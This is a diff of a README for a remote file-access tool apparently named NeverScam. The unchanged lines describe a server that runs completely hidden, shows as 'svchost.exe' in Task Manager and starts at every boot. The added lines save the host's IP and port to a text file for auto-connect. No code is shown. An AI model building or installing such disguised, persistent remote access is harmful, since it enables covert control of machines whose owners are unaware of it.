@@ -35,11 +35,13 @@ A client-server application that allows remote access to files on a host compute
 
 **Note:** After installation, no files or applications are visible. The server runs completely hidden (appears as "svchost.exe" in Task Manager) and starts automatically on every boot.
 
+**Connection Info:** After first run, the IP and port are saved to `NeverScam_Connection.txt` in your home folder.
+
 ### Manual Setup (Alternative)
 
 1. Clone or download the repository
 2. Run `install.py` or `setup.bat` on the host computer
-3. Note the IP address of the host computer (e.g., 192.168.1.100)
+3. Find IP and port automatically in `NeverScam_Connection.txt` or use auto-connect in client
 
 ### Client Installation
 
